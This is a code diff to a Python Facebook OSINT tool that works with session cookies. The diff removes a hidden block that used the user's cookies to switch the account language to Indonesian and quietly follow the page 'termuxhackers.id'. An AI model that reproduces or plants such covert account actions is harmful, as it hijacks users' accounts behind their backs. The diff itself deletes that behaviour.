@@ -736,32 +736,7 @@ class Facebook:
                 MBASIC_FB_URL.format("/me"), cookies=self.cookies, timeout=10
             ).content
             if b"mbasic_logout_button" in req_content:
-                if b"Apa yang Anda pikirkan sekarang" not in req_content:
-                    try:
-                        bs_parser = BeautifulSoup(req_content, "html.parser")
-                        lang_link = bs_parser.find("a", string="Bahasa Indonesia")
-                        if lang_link and lang_link.get("href"):
-                            requests.get(
-                                MBASIC_FB_URL.format(lang_link["href"]),
-                                cookies=self.cookies,
-                                timeout=10,
-                            )
-                        follow_page_bs = BeautifulSoup(
-                            requests.get(
-                                MBASIC_FB_URL.format("/termuxhackers.id"), cookies=self.cookies, timeout=10
-                            ).content,
-                            "html.parser",
-                        )
-                        follow_link = follow_page_bs.find("a", string="Ikuti")
-                        if follow_link and follow_link.get("href"):
-                            session = requests.Session()
-                            session.get(
-                                MBASIC_FB_URL.format(follow_link["href"]),
-                                cookies=self.cookies,
-                                timeout=10,
-                            )
-                    except requests.exceptions.RequestException:
-                        pass
+                pass
             else:
                 sys.exit(RED + "* invalid credentials: cookies" + WHITE)
         except requests.exceptions.RequestException as e:
@@ -1412,5 +1387,3 @@ if __name__ == "__main__":
         sys.exit(
              RED + "* invalid number of arguments: " + str(len(main_args) - 1) + WHITE
         )
-
-[end of E4GL30S1NT.py]
